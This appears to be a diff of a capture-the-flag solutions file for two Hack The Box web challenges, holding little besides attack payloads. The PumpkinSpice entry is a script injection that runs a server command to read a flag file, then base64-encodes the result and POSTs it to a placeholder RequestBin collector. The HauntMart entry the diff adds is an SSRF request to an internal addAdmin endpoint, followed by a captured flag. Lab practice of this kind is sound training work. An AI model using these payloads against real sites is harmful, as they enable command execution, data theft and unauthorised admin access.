@@ -219,5 +219,5 @@ PumpkinSpice:
 <script>fetch('/api/stats?command=cat /flagd016a781ea.txt').then((response) => response.text()).then((data) => {const base64Data = btoa(data);fetch('[RequestBinUrl]', {method: 'POST', headers: {'Content-Type': 'text/plain'}, body: base64Data}).then((response) => {if (response.ok) {console.log('Response data sent to your server successfully.');} else {console.error('Failed to send data to your server. Status:', response.status);}}).catch((error) => {console.error('Error:', error);});}).catch((error) => {console.error('Error fetching data from localhost:', error);});</script>
 
 HauntMart:
-
+"manual":"http://127.0.0.2:1337/api/addAdmin?username=test"
 HTB{s5rf_m4d3_m3_w3t_my_p4nts!}
